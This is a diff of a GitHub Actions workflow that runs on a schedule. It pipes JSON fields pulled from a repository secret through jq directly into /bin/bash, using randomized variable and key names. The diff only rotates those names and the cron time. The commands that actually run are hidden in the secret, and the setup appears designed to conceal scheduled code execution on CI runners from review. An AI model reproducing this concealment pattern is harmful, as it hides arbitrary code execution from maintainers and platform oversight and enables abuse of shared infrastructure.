@@ -1,30 +1,23 @@
 name: qianxuanbutong
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 5/6 * * *'
+    - cron: '26 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: qianxuanbutong
         env:
-          ky9508: ${{ secrets.ky9508 }}
+          tyva37227: ${{ secrets.tyva37227 }}
         run: |
-          echo $ky9508 | jq -r .ttyum5 | /bin/bash
-          echo $pvaz431 | jq -r .nege28 | /bin/bash
-          echo $k637 | jq -r .kabm569 | /bin/bash
-          echo $xb74 | jq -r .oq2414 | /bin/bash
-          echo $yyya3028 | jq -r .l364 | /bin/bash
-          echo $dl3 | jq -r .ndv6 | /bin/bash
-          echo $omyn988 | jq -r .us69 | /bin/bash
-          echo $i51456 | jq -r .xcxsv0 | /bin/bash
-          echo $cqfey3 | jq -r .fzjw59136 | /bin/bash
-          echo $kmu6299 | jq -r .mdie5946 | /bin/bash
-          echo $vf5675 | jq -r .y15 | /bin/bash
-          echo $yl39843 | jq -r .dnk1671 | /bin/bash
-          echo $g7 | jq -r .lcq535 | /bin/bash
-          echo $lvhbg6081 | jq -r .o8 | /bin/bash
+          echo $tyva37227 | jq -r .wjdmh0 | /bin/bash
+          echo $apyr94806 | jq -r .c4369 | /bin/bash
+          echo $gsb6 | jq -r .oj83 | /bin/bash
+          echo $rkues31 | jq -r .dhnov345 | /bin/bash
+          echo $gjsz57 | jq -r .yoxbq6566 | /bin/bash
+          echo $tumiw5774 | jq -r .pg56573 | /bin/bash
+          echo $grwje7423 | jq -r .hrvig337 | /bin/bash
 
